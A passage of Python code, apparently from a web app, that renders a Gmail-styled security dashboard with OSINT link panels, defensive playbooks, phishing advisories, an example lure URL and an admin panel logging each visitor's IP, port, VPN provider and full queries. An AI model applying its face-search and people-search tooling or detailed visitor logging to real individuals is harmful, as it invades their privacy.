                    <div class="card-head"><h3>&#128100; Person &amp; Email OSINT</h3></div>
                    <div style="display:flex; flex-wrap:wrap; gap:8px; margin-top:8px;">
                        <a href="https://haveibeenpwned.com" target="_blank" class="quick-btn">HaveIBeenPwned</a>
                        <a href="https://hunter.io" target="_blank" class="quick-btn">Hunter.io</a>
                        <a href="https://www.spokeo.com" target="_blank" class="quick-btn">Spokeo</a>
                        <a href="https://www.truecaller.com" target="_blank" class="quick-btn">Truecaller</a>
                        <a href="https://epieos.com" target="_blank" class="quick-btn">Epieos (Email OSINT)</a>
                        <a href="https://osintframework.com" target="_blank" class="quick-btn">OSINT Framework</a>
                    </div>
                </div>
                <div class="card" style="border-left:4px solid #00ffab;">
                    <div class="card-head"><h3>&#128247; Image &amp; Social OSINT</h3></div>
                    <div style="display:flex; flex-wrap:wrap; gap:8px; margin-top:8px;">
                        <a href="https://lens.google.com" target="_blank" class="quick-btn">Google Lens</a>
                        <a href="https://tineye.com" target="_blank" class="quick-btn">TinEye</a>
                        <a href="https://yandex.com/images" target="_blank" class="quick-btn">Yandex Image</a>
                        <a href="https://pimeyes.com" target="_blank" class="quick-btn">PimEyes Face Search</a>
                        <a href="https://mattw.io/youtube-metadata" target="_blank" class="quick-btn">YouTube Metadata</a>
                        <a href="https://github.com/sherlock-project/sherlock" target="_blank" class="quick-btn">Sherlock (Username)</a>
                    </div>
                </div>
            </div>

            <div class="card" style="border-left:4px solid #facc15; margin-top:0;">
                <div class="card-head"><h3>&#128736;&#65039; OSINT Methodology Framework</h3></div>
                <div style="font-size:12px; color:#94a3b8; line-height:1.7; margin-top:8px;">
                    <strong style="color:#facc15;">Phase 1: Passive Reconnaissance</strong> — DNS records, WHOIS, SSL certs, wayback machine, LinkedIn profiles<br>
                    <strong style="color:#f97316;">Phase 2: Active Enumeration</strong> — Subdomain enumeration, port scanning, web crawling<br>
                    <strong style="color:#38bdf8;">Phase 3: Correlation</strong> — Cross-reference social media, breach data, image search, username tracking<br>
                    <strong style="color:#00ffab;">Phase 4: Analysis</strong> — Map attack surface, identify vulnerabilities, create risk profile<br>
                    <a href="https://osintframework.com" target="_blank" class="quick-btn" style="margin-top:12px; display:inline-block;">&#127760; Full OSINT Framework Map</a>
                </div>
            </div>
        </div>
        """

    # --------------------------------------------------------
    # GMAIL-STYLE FOLDERS: STARRED, IMPORTANT, SPAM, TRASH
    # --------------------------------------------------------
    elif active_tab == "starred":
        content_html = f"""
        <div class="tool-pane">
            <div class="pane-header">
                <h2>⭐ Starred Security Scans & Priority Playbooks</h2>
                <span class="badge pass">SAVED FAVORITES</span>
            </div>
            <p class="tool-desc">Quickly access your starred tools, high-priority playbooks, and critical containment routines.</p>
            
            <div class="diag-grid">
                <div class="diag-card diag-pass">
                    <div class="diag-head">
                        <div class="diag-title">⭐ Priority Playbook: Emergency Compromised Account Isolation</div>
                        <span class="badge pass">CRITICAL</span>
                    </div>
                    <div class="diag-desc">1. Terminate all active OAuth and SSO tokens. 2. Revoke application-specific passwords. 3. Enforce FIDO2 hardware MFA.</div>
                    <div style="margin-top:10px;"><a href="/?tab=ai&target=emergency+account+compromise" class="quick-btn">Run AI Containment</a></div>
                </div>

                <div class="diag-card diag-pass">
                    <div class="diag-head">
                        <div class="diag-title">⭐ Starred Tool: Zero-Trust SPF & DMARC Enforcement</div>
                        <span class="badge pass">DOMAIN SECURITY</span>
                    </div>
                    <div class="diag-desc">Continuously verify that your domain's DMARC policy is set to <code>p=quarantine</code> or <code>p=reject</code> to eliminate domain forgery.</div>
                    <div style="margin-top:10px;"><a href="/?tab=email" class="quick-btn">Open Posture Tool</a></div>
                </div>

                <div class="diag-card diag-pass">
                    <div class="diag-head">
                        <div class="diag-title">⭐ Starred Tool: Source Code Threat Sanitizer</div>
                        <span class="badge pass">CODE DEFENSE</span>
                    </div>
                    <div class="diag-desc">Audit third-party scripts, dependencies, and PRs for obfuscated command execution, RCE, and leaked API secrets before deployment.</div>
                    <div style="margin-top:10px;"><a href="/?tab=code" class="quick-btn">Open Code Audit</a></div>
                </div>
            </div>
        </div>
        """

    elif active_tab == "important":
        content_html = f"""
        <div class="tool-pane">
            <div class="pane-header">
                <h2>⚡ Important Security Alerts & Critical Advisories</h2>
                <span class="badge fail">HIGH PRIORITY</span>
            </div>
            <p class="tool-desc">Actionable high-priority advisories and zero-day threat intelligence requiring immediate administrative attention.</p>
            
            <div class="diag-grid">
                <div class="diag-card diag-fail">
                    <div class="diag-head">
                        <div class="diag-title">🚨 Threat Alert: Active DMARC p=none Exploitation Campaigns</div>
                        <span class="badge fail">CRITICAL RISK</span>
                    </div>
                    <div class="diag-desc">Threat actors are actively leveraging domains with <code>p=none</code> policies to bypass email spam filters and deliver spear-phishing messages. Check your domain immediately.</div>
                    <div style="margin-top:10px;"><a href="/?tab=email" class="quick-btn" style="background:#401017; color:#f87171;">Audit Domain DMARC Now</a></div>
                </div>

                <div class="diag-card diag-warn">
                    <div class="diag-head">
                        <div class="diag-title">⚠ High Alert: Punycode & Lookalike Brand Spoofing</div>
                        <span class="badge warn">PHISHING SPIKE</span>
                    </div>
                    <div class="diag-desc">Phishing campaigns are utilizing internationalized domain names (IDN / punycode) to masquerade as major banks and cloud services. Use our URL analyzer to inspect lookalike domains.</div>
                    <div style="margin-top:10px;"><a href="/?tab=url" class="quick-btn" style="background:#3b300f; color:#facc15;">Verify URL Posture</a></div>
                </div>
            </div>
        </div>
        """

    elif active_tab == "spam":
        content_html = f"""
        <div class="tool-pane">
            <div class="pane-header">
                <h2>🚫 Spam & Phishing Threat Quarantine</h2>
                <span class="badge warn">VERIFIED THREATS</span>
            </div>
            <p class="tool-desc">Curated threat repository of verified phishing lures, fake bank portals, and malicious indicators.</p>
            
            <table class="telemetry-table">
                <thead>
                    <tr>
                        <th>Threat Category</th>
                        <th>Typical Lure & Signature</th>
                        <th>Attack Vector</th>
                        <th>Action</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td><span class="badge fail">Brand Phish</span></td>
                        <td><code>service-paypal-verify.xyz/login</code></td>
                        <td>Credential Harvesting</td>
                        <td><a href="/?tab=url&target=http://service-paypal-verify.xyz/login" class="quick-btn">Audit Lure</a></td>
                    </tr>
                    <tr>
                        <td><span class="badge fail">Urgent BEC</span></td>
                        <td>"Invoice Attached - Payment Overdue Action Required"</td>
                        <td>Executable Dropper Attachment</td>
                        <td><a href="/?tab=ai&target=phishing+invoice+attached" class="quick-btn">AI Response</a></td>
                    </tr>
                </tbody>
            </table>
        </div>
        """

    elif active_tab == "trash":
        content_html = f"""
        <div class="tool-pane">
            <div class="pane-header">
                <h2>🗑️ Trash & Disarmed Quarantined Payloads</h2>
                <span class="badge error">QUARANTINE</span>
            </div>
            <p class="tool-desc">Safely disarmed code payloads, purged scan caches, and temporary telemetry traces.</p>
            <div class="card breach-clean">
                <h3>✓ Threat Vault Clean</h3>
                <p style="font-size:13px; color:#859ba7;">No active disarmed payloads pending purging. The virtual in-memory database holds live scan records.</p>
                <a href="/admin-clear-logs" class="quick-btn" style="background:#401017; color:#f87171;">Purge Virtual Database Memory Logs</a>
            </div>
        </div>
        """

    # --------------------------------------------------------
    # TAB: ADMIN ACCESS & AUDIT PORTAL
    # --------------------------------------------------------
    elif active_tab == "admin":
        if not ADMIN_STATE["is_configured"]:
            content_html = f"""
            <div class="tool-pane">
                <div class="pane-header">
                    <h2>🔐 Initial Administrator Credentials Setup</h2>
                    <span class="badge warn">SETUP REQUIRED</span>
                </div>
                <p class="tool-desc">Welcome! As the administrator, set your master username and secure password below. Set your admin credentials below. Account recovery is linked to: <code>b*******ys@gmail.com</code>.</p>
                
                <form method="POST" action="/admin-setup" style="flex-direction:column; max-width:450px;">
                    <div style="margin-bottom:10px;">
                        <label style="font-size:12px; color:#00ffab; font-weight:bold;">Admin Username:</label>
                        <input name="username" placeholder="Choose Admin Username" required value="admin" style="width:100%; margin-top:4px;">
                    </div>
                    <div style="margin-bottom:10px;">
                        <label style="font-size:12px; color:#00ffab; font-weight:bold;">Master Password:</label>
                        <input type="password" name="password" placeholder="Choose Master Password" required style="width:100%; margin-top:4px;">
                    </div>
                    <div style="display:flex; align-items:center; gap:10px; margin-bottom:12px; margin-top:8px;">
                        <input type="checkbox" name="remember" id="setup_remember" value="on" checked style="width:16px; height:16px; cursor:pointer; accent-color:#00ffab;">
                        <label for="setup_remember" style="font-size:12px; color:#94a3b8; cursor:pointer;">Remember me for 30 days on this device</label>
                    </div>
                    <button type="submit" style="width:100%; padding:12px; font-size:14px;">&#128274; Save Credentials & Enter Portal</button>
                </form>
            </div>
            """
        elif not is_admin:
            reset_msg = ""

            recovery_form = ""
            if ADMIN_STATE.get("reset_token") and time.time() < ADMIN_STATE.get("reset_expiry", 0):
                recovery_form = f"""
                <div class="card" style="margin-top:20px; border-left: 4px solid #facc15;">
                    <h3 style="color:#facc15;">🔑 Reset Master Password (Recovery Active)</h3>
                    <p style="font-size:12px; color:#cbd5e1;">A recovery code was sent to <code>b*******ys@gmail.com</code>. Enter it below:. Enter it below with your new password:</p>
                    <form method="POST" action="/admin-reset-confirm" style="flex-direction:column; max-width:450px;">
                        <input name="reset_code" placeholder="Enter 8-Character Recovery Code" required style="width:100%; margin-bottom:8px;">
                        <input type="password" name="new_password" placeholder="Enter New Master Password" required style="width:100%; margin-bottom:8px;">
                        <button type="submit" style="width:100%;">Update Password & Login</button>
                    </form>
                </div>
                """

            # Render msg and clear it so it doesn't persist across page loads
            reset_msg = ""
            if ADMIN_STATE.get("reset_msg"):
                reset_msg = f'<div class="breakpoint-marker" style="margin-bottom:15px; text-align:left; background:rgba(239, 68, 68, 0.15); border:1px solid #ef4444; color:#fca5a5; padding:12px; border-radius:6px;">&#9888; {ADMIN_STATE["reset_msg"]}</div>'
                ADMIN_STATE["reset_msg"] = None

            content_html = f"""
            <div class="tool-pane">
                <div class="pane-header">
                    <h2>🔐 Administrator Authentication</h2>
                    <span class="badge pass">ADMIN ONLY</span>
                </div>
                <p class="tool-desc">Access to visitor telemetry logs and activity monitoring is restricted to authorized administrators. Enter the master credentials below to access the admin portal.</p>
                {reset_msg}
                
                <form method="POST" action="/admin-login" style="flex-direction:column; max-width:480px; background:#07141b; border:1px solid #143542; padding:24px; border-radius:8px;">
                    <div style="margin-bottom:14px;">
                        <label style="font-size:12px; color:#00ffab; font-weight:bold;">Admin Username:</label>
                        <input name="username" placeholder="Admin Username" required value="admin" style="width:100%; margin-top:6px;" autocomplete="username">
                    </div>
                    <div style="margin-bottom:14px;">
                        <label style="font-size:12px; color:#00ffab; font-weight:bold;">Master Password:</label>
                        <div style="display:flex; gap:8px; margin-top:6px;">
                            <input type="password" name="password" id="admin_pwd" placeholder="Enter master password" required style="flex:1;" autocomplete="current-password">
                            <button type="button" onclick="var p=document.getElementById('admin_pwd');p.type=p.type==='password'?'text':'password';" style="background:#0a1a16; color:#00ffab; border-color:#1a5040; padding:8px 14px; font-size:13px; cursor:pointer;" title="Show/Hide Password">👁️</button>
                        </div>
                    </div>
                    <div style="display:flex; align-items:center; gap:8px; margin-bottom:14px;">
                        <input type="checkbox" name="remember" id="remember_me" value="on" checked style="width:16px; height:16px; cursor:pointer; accent-color:#00ffab;">
                        <label for="remember_me" style="font-size:12px; color:#94a3b8; cursor:pointer;">Remember me for 30 days (stay logged in)</label>
                    </div>
                    <button type="submit" style="width:100%; padding:14px; font-size:14px; font-weight:800; background:linear-gradient(135deg, #00c98a, #00ffab); color:#03140e; border:none; border-radius:6px; cursor:pointer;">🔐 Login to Admin Portal</button>
                </form>
            </div>
            """
        else:
            stats = VIRTUAL_DB.get_stats()
            logs = VIRTUAL_DB.get_logs(150)

            rows_html = ""
            for l in logs:
                vpn_badge = '<span class="badge fail">🚨 VPN / PROXY</span>' if l["is_vpn"] else '<span class="badge pass">✅ DIRECT</span>'
                rows_html += f"""
                <tr>
                    <td><strong>#{l['id']}</strong></td>
                    <td style="white-space:nowrap;"><strong>{l['timestamp']}</strong></td>
                    <td><code>{safe(l['ip'])}:{l['port']}</code></td>
                    <td>
                        {vpn_badge}<br>
                        <small style="color:#f87171; font-weight:bold;">{safe(l['vpn_name'])}</small><br>
                        <small style="color:#859ba7;">{safe(l['vpn_address'])}</small>
                    </td>
                    <td><span class="highlight">{safe(l['module'])}</span></td>
                    <td style="max-width:180px; word-break:break-all;">
                        <code>{safe(l['input'])}</code>
                    </td>
                    <td style="max-width:240px;">
                        <div>{safe(l['summary'])}</div>
                    </td>
                    <td style="font-size:11px; color:#859ba7; white-space:nowrap;">
                        <strong>Before:</strong> {safe(l['state_before'])}<br>
                        <strong>After:</strong> {safe(l['state_after'])}
                    </td>
                    <td>
                        <details>
                            <summary class="quick-btn" style="cursor:pointer; display:inline-block; user-select:none;">👁️ Full Dossier</summary>
                            <div style="background:#050d12; border:1px solid #1a3c48; border-radius:6px; padding:12px; margin-top:8px; width:380px; font-size:11px; text-align:left;">
                                <div style="color:#00ffab; font-weight:bold; margin-bottom:4px;">📥 WHAT HE ASKED / ENTERED:</div>
                                <pre style="background:#020608; border:1px solid #132731; padding:8px; border-radius:4px; color:#e2fbf4; font-family:Consolas,monospace; white-space:pre-wrap; max-height:160px; overflow-y:auto;">{safe(l['input'])}</pre>
                                
                                <div style="color:#38bdf8; font-weight:bold; margin:8px 0 4px;">📤 WHAT I GAVE / REPORT DELIVERED:</div>
                                <pre style="background:#020608; border:1px solid #132731; padding:8px; border-radius:4px; color:#cbd5e1; font-family:Consolas,monospace; white-space:pre-wrap; max-height:180px; overflow-y:auto;">{safe(l['data_given'])}</pre>
                                
                                <div style="margin-top:8px; border-top:1px solid #172d38; padding-top:6px; color:#859ba7;">
                                    <strong>Source Port:</strong> {l['port']} &bull; <strong>VPN Alert:</strong> {safe(l['vpn_alert'])}<br>
                                    <strong>Time:</strong> {safe(l['timestamp'])}
                                </div>
                            </div>
                        </details>
                    </td>
                </tr>
                """

            content_html = f"""
            <div class="tool-pane">
                <div class="card-head">
                    <h2>🔐 Administrator Telemetry & In-Memory Virtual Database</h2>
                    <a href="/admin-logout" class="badge error" style="text-decoration:none; padding:8px 14px; font-size:12px;">Logout Admin</a>
                </div>
                
                <div class="summary-card">
                    <div class="summary-left">
                        <div class="score-display">{stats['total_scans']}<span> Scans</span></div>
                        <div class="risk-label">In-Memory Virtual DB</div>
                    </div>
                    <div class="summary-right">
                        <div><strong>Active VPN / Proxy Alerts:</strong> <span style="color:#ef4444; font-weight:bold;">{stats['vpn_alerts']}</span></div>
                        <div><strong>Unique Visitor IP Addresses:</strong> {stats['unique_ips']}</div>
                        <div><strong>Recovery & Alerts Email:</strong> <span class="highlight">{ADMIN_EMAIL_DISPLAY}</span></div>
                        <div><strong>Storage Architecture:</strong> <span class="badge pass">Strictly Virtual / In-Memory (No External Disk Files)</span></div>
                    </div>
                </div>

                <div class="card">
                    <div class="card-head">
                        <h3>Visitor Ports, Live Telemetry, VPN Alerts & Audit Dossier Table</h3>
                        <a href="/admin-clear-logs" onclick="return confirm('Clear in-memory database records?');" class="quick-btn" style="background:#401017; color:#f87171;">Clear Virtual DB Logs</a>
                    </div>
                    <p style="font-size:12px; color:#859ba7; margin-bottom:14px;">
                        All visitor queries recorded with client ephemeral ports, present IP address, VPN name/address alerts, before & after site states, full input details (what they asked), and complete output report (what we gave), arranged with 12-hour AM/PM timestamps:
                    </p>
                    
                    <div style="overflow-x:auto;">
                        <table class="telemetry-table">
                            <thead>
                                <tr>
                                    <th>ID</th>
                                    <th>Date & Time (AM/PM)</th>
                                    <th>Visitor IP & Client Port</th>
                                    <th>VPN Detection & Provider</th>
                                    <th>Module Used</th>
                                    <th>What He Asked (Details Entered)</th>
                                    <th>What I Gave (Report Summary)</th>
                                    <th>Site State Changes (Before & After)</th>
                                    <th>Full Forensic Dossier</th>
                                </tr>
                            </thead>
                            <tbody>
                                {rows_html or '<tr><td colspan="9" style="text-align:center; padding:20px;">No telemetry records logged in virtual database yet. Run any security scan above to generate live records!</td></tr>'}
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
            """

    # --------------------------------------------------------
    # FULL PAGE TEMPLATE & GMAIL-STYLE SIDEBAR
    # --------------------------------------------------------
    admin_btn_label = "🔐 Admin Portal (Logged In)" if is_admin else "🔐 Admin Portal"

    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>{SITE_NAME} &mdash; Complete Cybersecurity & Forensic Lab</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
<style>
* {{ box-sizing: border-box; }}
body {{
    font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    background: radial-gradient(circle at 50% 0%, #0d2822 0%, #070c10 40%, #05080a 100%);
    color: #d1dde5;
    margin: 0;
    padding: 0;
    display: flex;
    min-height: 100vh;
}}

/* GMAIL-STYLE SIDEBAR */
.sidebar {{
    width: 275px;
    background: #060b0f;
    border-right: 1px solid #142730;
    padding: 20px 12px;
    display: flex;
    flex-direction: column;
    gap: 4px;
    flex-shrink: 0;
}}
.sidebar-logo {{
    font-size: 15px;
    font-weight: 800;
    color: #00ffab;
    letter-spacing: 0.8px;
    padding: 0 10px 16px;
    border-bottom: 1px solid #152731;
    margin-bottom: 12px;
    display: flex;
    align-items: center;
    gap: 8px;
}}
.compose-btn {{
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    padding: 12px;
    border-radius: 20px;
    background: linear-gradient(135deg, #00c98a, #00ffab);
    color: #03140e;
    text-decoration: none;
    font-size: 13px;
    font-weight: 800;
    margin: 0 4px 16px;
    box-shadow: 0 4px 14px rgba(0, 255, 171, 0.25);
    transition: 0.2s;
}}
.compose-btn:hover {{
    transform: translateY(-1px);
    box-shadow: 0 6px 20px rgba(0, 255, 171, 0.4);
}}
.nav-section-title {{
    font-size: 10px;
    font-weight: 700;
    color: #557280;
    text-transform: uppercase;
    letter-spacing: 1px;
    padding: 8px 12px 4px;
}}
.nav-item {{
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 8px 12px;
    border-radius: 6px;
    color: #8fa5b0;
    text-decoration: none;
    font-size: 13px;
    font-weight: 500;
    transition: 0.15s;
}}
.nav-item-left {{
    display: flex;
    align-items: center;
    gap: 10px;
}}
.nav-item:hover {{
    background: #0c1a22;
    color: #00ffab;
}}
.nav-item.active {{
    background: #092820;
    color: #00ffab;
    border-left: 3px solid #00ffab;
    font-weight: 700;
}}
.nav-icon {{ font-size: 15px; width: 20px; text-align: center; }}
.nav-badge {{
    font-size: 10px;
    font-weight: 700;
    padding: 2px 6px;
    border-radius: 10px;
    background: #11232c;
    color: #8fa5b0;
}}

/* MAIN CONTENT AREA */
.main-wrapper {{
    flex: 1;
    padding: 30px 40px 60px;
    overflow-y: auto;
    max-width: 1240px;
}}
.header {{
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 25px;
    flex-wrap: wrap;
    gap: 15px;
}}
h1 {{
    color: #00ffab;
    font-size: 32px;
    font-weight: 900;
    letter-spacing: 1px;
    margin: 0 0 6px;
    text-shadow: 0 0 20px rgba(0, 255, 171, 0.25);
}}
.subtitle {{
    color: #7b919d;
    font-size: 12px;
    letter-spacing: 1px;
    text-transform: uppercase;
    font-weight: 600;
}}

/* COMMON COMPONENTS */
.pane-header {{
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 6px;
}}
.tool-desc {{
    color: #859ba7;
    font-size: 13px;
    line-height: 1.5;
    margin: 0 0 16px;
}}
form {{
    display: flex;
    gap: 10px;
    margin: 14px 0 22px;
    padding: 12px;
    background: #091217;
    border: 1px solid #1a343c;
    border-radius: 8px;
}}
input, textarea, select {{
    flex: 1;
    padding: 12px 16px;
    border-radius: 6px;
    border: 1px solid #1c3d44;
    background: #050a0d;
    color: #e2fbf4;
    font-family: 'JetBrains Mono', Consolas, monospace;
    font-size: 13px;
    outline: none;
}}
input:focus, textarea:focus, select:focus {{ border-color: #00ffab; }}
.code-textarea {{
    width: 100%;
    resize: vertical;
}}
button {{
    padding: 12px 22px;
    border: none;
    border-radius: 6px;
    background: #00c98a;
    color: #04120f;
    font-size: 13px;
    font-weight: 700;
    cursor: pointer;
    transition: 0.2s;
}}
button:hover {{ background: #00ffab; box-shadow: 0 0 12px rgba(0, 255, 171, 0.4); }}

.card {{
    background: #0a131a;
    border: 1px solid #172c35;
    border-radius: 8px;
    padding: 20px;
    margin-bottom: 20px;
}}
.card-head {{
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 12px;
}}
.card-head h3 {{ margin: 0; font-size: 16px; color: #00ffab; }}
.card-head h2 {{ margin: 0; font-size: 20px; color: #00ffab; }}

.summary-card {{
    display: flex;
    justify-content: space-between;
    align-items: center;
    background: linear-gradient(135deg, #0c1a20, #081116);
    border: 1px solid #1f424b;
    border-radius: 10px;
    padding: 22px 28px;
    margin-bottom: 22px;
    flex-wrap: wrap;
    gap: 20px;
}}
.summary-left {{ display: flex; align-items: center; gap: 20px; }}
.grade-badge {{
    width: 65px;
    height: 65px;
    border-radius: 50%;
    display: flex;
    justify-content: center;
    align-items: center;
    font-size: 26px;
    font-weight: 900;
}}
.grade-a {{ background: #063828; color: #00ffab; border: 2px solid #00ffab; }}
.grade-b {{ background: #133446; color: #38bdf8; border: 2px solid #38bdf8; }}
.grade-c {{ background: #3b300f; color: #facc15; border: 2px solid #facc15; }}
.grade-d {{ background: #401b10; color: #fb923c; border: 2px solid #fb923c; }}
.grade-f {{ background: #401017; color: #f87171; border: 2px solid #f87171; }}
.score-display {{ font-size: 34px; font-weight: 900; color: #e6fdf6; }}
.score-display span {{ font-size: 16px; color: #627b87; }}
.risk-label {{ font-size: 12px; font-weight: 800; letter-spacing: 1px; color: #00ffab; }}
.summary-right {{ line-height: 1.8; color: #92a8b3; font-size: 13px; }}
.highlight {{ color: #00ffab; font-weight: 700; }}

/* GRAPHICAL PIPELINE FLOW */
.graph-title {{ margin: 0 0 4px; font-size: 17px; color: #00ffab; }}
.pipeline-flow {{
    display: flex;
    justify-content: space-between;
    align-items: center;
    gap: 8px;
    margin: 20px 0 15px;
    overflow-x: auto;
    padding-bottom: 10px;
}}
.flow-node {{
    flex: 1;
    min-width: 120px;
    padding: 12px 8px;
    border-radius: 8px;
    background: #0e171e;
    border: 1px solid #1b3542;
    text-align: center;
    position: relative;
}}
.node-pass {{ border-color: #00c98a; background: #06261d; }}
.node-warn {{ border-color: #eab308; background: #261f07; }}
.node-fail {{ border-color: #ef4444; background: #290d11; }}
.node-neutral {{ border-color: #38bdf8; background: #081a24; }}
.node-icon {{ font-size: 18px; margin-bottom: 4px; }}
.node-name {{ font-size: 11px; font-weight: 700; color: #e2f1f8; margin-bottom: 4px; }}
.node-meta {{ font-size: 10px; color: #839ca7; }}
.node-status-badge {{
    position: absolute;
    top: -8px;
    right: 6px;
    font-size: 8px;
    font-weight: 800;
    padding: 2px 4px;
    border-radius: 3px;
}}
.node-pass .node-status-badge {{ background: #00c98a; color: #051410; }}
.node-warn .node-status-badge {{ background: #eab308; color: #1c1503; }}
.node-fail .node-status-badge {{ background: #ef4444; color: #fff; }}
.flow-connector {{ font-size: 18px; font-weight: 700; color: #4b6672; user-select: none; }}
.breakpoint-marker {{
    margin-top: 15px;
    padding: 10px 14px;
    background: #2b0b10;
    border: 1px solid #ef4444;
    border-radius: 6px;
    color: #fca5a5;
    font-size: 12px;
    font-weight: 700;
    text-align: center;
}}

/* BREACH SECTION */
.breach-container {{ border-radius: 10px; padding: 20px; margin-bottom: 20px; }}
.breach-alert {{ background: linear-gradient(135deg, #1c0e12, #0d0709); border: 1px solid #7f1d1d; }}
.breach-clean {{ background: linear-gradient(135deg, #091a14, #050e0b); border: 1px solid #065f46; }}
.breach-neutral {{ background: linear-gradient(135deg, #0d151c, #070c10); border: 1px solid #1e3a47; }}
.breach-header {{ display: flex; justify-content: space-between; align-items: center; margin-bottom: 14px; flex-wrap: wrap; }}
.breach-headline {{ margin: 0 0 4px; font-size: 17px; color: #f87171; }}
.breach-headline-clean {{ margin: 0 0 4px; font-size: 17px; color: #34d399; }}
.breach-headline-neutral {{ margin: 0 0 4px; font-size: 17px; color: #38bdf8; }}
.breach-sub {{ color: #9ca3af; font-size: 12px; }}
.breach-grid {{ display: grid; grid-template-columns: repeat(auto-fill, minmax(260px, 1fr)); gap: 14px; margin-top: 14px; }}
.breach-item-card {{ background: #111a21; border: 1px solid #203541; border-radius: 8px; padding: 12px; }}
.breach-card-top {{ display: flex; align-items: center; gap: 10px; margin-bottom: 8px; }}
.breach-logo {{ width: 36px; height: 36px; border-radius: 6px; object-fit: contain; background: #fff; padding: 2px; }}
.breach-title {{ margin: 0; font-size: 14px; color: #f3f4f6; }}
.breach-domain {{ font-size: 11px; color: #94a3b8; }}
.breach-year {{ color: #f87171; font-weight: 700; }}
.breach-tags {{ display: flex; flex-wrap: wrap; gap: 4px; margin: 6px 0; }}
.tag-pill {{ display: inline-block; padding: 2px 6px; border-radius: 4px; font-size: 10px; background: #1e293b; color: #cbd5e1; }}
.tag-pill.tag-danger {{ background: #450a0a; color: #fca5a5; font-weight: 700; }}
.tag-pill.tag-warning {{ background: #3b2005; color: #fde047; }}
.breach-desc {{ font-size: 11px; line-height: 1.4; color: #94a3b8; margin: 4px 0 0; }}

/* DIAGNOSTICS */
.diag-grid {{ display: grid; grid-template-columns: 1fr; gap: 14px; margin-top: 14px; }}
.diag-card {{ background: #0a141b; border: 1px solid #1c333f; border-radius: 8px; padding: 16px; }}
.diag-card.diag-pass {{ border-left: 4px solid #00c98a; }}
.diag-card.diag-warn {{ border-left: 4px solid #eab308; }}
.diag-card.diag-fail {{ border-left: 4px solid #ef4444; }}
.diag-head {{ display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }}
.diag-title {{ font-size: 14px; font-weight: 700; color: #e2f1f8; }}
.diag-row {{ margin-bottom: 8px; }}
.diag-label {{ font-size: 11px; font-weight: 700; color: #00ffab; text-transform: uppercase; margin-bottom: 2px; }}
.diag-value {{ font-size: 12px; color: #cbd5e1; }}
.diag-desc {{ font-size: 12px; color: #94a3b8; line-height: 1.5; }}
.diag-threat {{ font-size: 12px; color: #fca5a5; line-height: 1.5; }}
.diag-code {{ background: #050a0d; border: 1px solid #172d36; border-radius: 5px; padding: 8px 10px; margin: 4px 0 0; color: #8ed6c0; font-family: 'JetBrains Mono', Consolas, monospace; font-size: 11px; white-space: pre-wrap; }}

/* BADGES */
.badge {{ padding: 3px 8px; border-radius: 4px; font-size: 10px; font-weight: 700; text-transform: uppercase; }}
.badge.pass {{ background: #063828; color: #00ffab; border: 1px solid #00a976; }}
.badge.warn {{ background: #3b300f; color: #facc15; border: 1px solid #b59210; }}
.badge.fail {{ background: #401017; color: #f87171; border: 1px solid #a72b35; }}
.badge.error {{ background: #222933; color: #94a3b8; border: 1px solid #475569; }}

/* BUTTONS & TABLES */
.search-engine-btn {{ display: inline-block; padding: 9px 16px; margin: 4px; background: #0d1e26; border: 1px solid #1a3c48; border-radius: 6px; color: #00ffab; text-decoration: none; font-size: 12px; font-weight: 700; transition: 0.2s; }}
.search-engine-btn:hover {{ background: #00ffab; color: #05090d; }}
.quick-btn {{ background: #0d1a1f; border: 1px solid #1a3840; color: #00ffab; padding: 6px 12px; border-radius: 4px; text-decoration: none; font-size: 11px; font-weight: 600; display: inline-block; margin: 3px; transition: 0.15s; }}
.quick-btn:hover {{ background: #00ffab; color: #070b10; }}
.telemetry-table {{ width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 12px; }}
.telemetry-table th, .telemetry-table td {{ border: 1px solid #162a34; padding: 10px 12px; text-align: left; }}
.telemetry-table th {{ background: #0c1820; color: #00ffab; font-weight: 700; }}
.telemetry-table tr:nth-child(even) {{ background: #060d12; }}

/* CODE FINDINGS */
.code-finding-card {{ background: #081015; border: 1px solid #1a3440; border-radius: 6px; padding: 12px; margin-bottom: 12px; }}

/* AI CHAT */
.chat-response-card {{ display: flex; gap: 14px; background: #07151c; border: 1px solid #153847; border-radius: 8px; padding: 18px; margin-top: 15px; }}
.chat-avatar {{ font-size: 26px; }}
.chat-content {{ flex: 1; }}
.chat-pre {{ margin: 0; font-family: 'Inter', -apple-system, sans-serif; white-space: pre-wrap; line-height: 1.6; color: #d6e8f0; font-size: 13px; }}

@media (max-width: 900px) {{
    body {{ flex-direction: column; }}
    .sidebar {{ width: 100%; border-right: none; border-bottom: 1px solid #142730; }}
    .pipeline-flow {{ flex-direction: column; }}
    .main-wrapper {{ padding: 20px; }}
}}
</style>
</head>
<body>

<!-- GMAIL-STYLE SIDEBAR -->
<div class="sidebar">
    <div class="sidebar-logo">🛡️ {SITE_NAME}</div>
    <a href="/?tab=attack" class="compose-btn">⚔️ Triage Cyber Attack</a>

    <div class="nav-section-title">MAILBOX & ALERTS</div>
    <a href="/?tab=email" class="nav-item {t_active['email']}"><div class="nav-item-left"><span class="nav-icon">📥</span> All Scans / Overview</div><span class="nav-badge">LIVE</span></a>
    <a href="/?tab=starred" class="nav-item {t_active['starred']}"><div class="nav-item-left"><span class="nav-icon">⭐</span> Starred Playbooks</div><span class="nav-badge">SAVED</span></a>
    <a href="/?tab=important" class="nav-item {t_active['important']}"><div class="nav-item-left"><span class="nav-icon">⚡</span> Important Alerts</div><span class="nav-badge" style="background:#401017; color:#f87171;">HIGH</span></a>
